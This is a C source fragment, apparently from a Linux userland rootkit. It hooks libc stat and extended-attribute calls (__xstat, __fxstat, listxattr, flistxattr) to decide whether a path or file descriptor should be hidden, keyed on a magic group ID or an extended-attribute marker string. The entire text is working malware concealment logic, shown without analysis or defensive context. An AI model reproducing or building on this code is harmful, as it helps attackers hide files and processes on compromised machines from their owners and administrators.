int hxstat(const char *path)
{
    if(strcmp(path, "/proc/")) return hxattr(path);

    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(stat));
    
    HOOK(o_xstat, "__xstat");
    (void) o_xstat(_STAT_VER, path, &s_fstat);
    if(s_fstat.st_gid == MGID) return 1;

    return 0;
}

int hfxstat(int fd)
{
    struct stat s_fstat;
    memset(&s_fstat, 0, sizeof(stat));
    
    HOOK(o_fxstat, "__fxstat");
    (void) o_fxstat(_STAT_VER, fd, &s_fstat);
    if(s_fstat.st_gid == MGID) return 1;

    return 0;
}

int hxattr(const char *path)
{
    ssize_t buflen, keylen;
    char *buf, *key;
    int ret = 0;

    HOOK(o_listxattr, "listxattr");
    if(!(buflen = o_listxattr(path, NULL, 0))) return ret;
    buf=malloc(buflen);
    if(!(buflen = o_listxattr(path, buf, buflen))) return ret;

    key=buf;
    while(buflen > 0)
    {
        if(strstr(key, HXATTR_STR))
        {
            ret = 1;
            goto fend;
        }

        keylen = strlen(key) + 1;
        buflen -= keylen;
        key += keylen;
    }
    
fend:
    if(buf) free(buf);
    return ret;
}

int hfxattr(int fd)
{
    ssize_t buflen, keylen;
    char *buf, *key;
    int ret = 0;

    HOOK(o_flistxattr, "flistxattr");
    if(!(buflen = o_flistxattr(fd, NULL, 0))) return ret;
    buf=malloc(buflen);
    if(!(buflen = o_flistxattr(fd, buf, buflen))) return ret;

    key=buf;
    while(buflen > 0)
    {
        if(strstr(key, HXATTR_STR))
        {
            ret = 1;
            goto fend;
        }

        keylen = strlen(key) + 1;
        buflen -= keylen;
        key += keylen;
    }

fend:
    if(buf) free(buf);
    return ret;
}
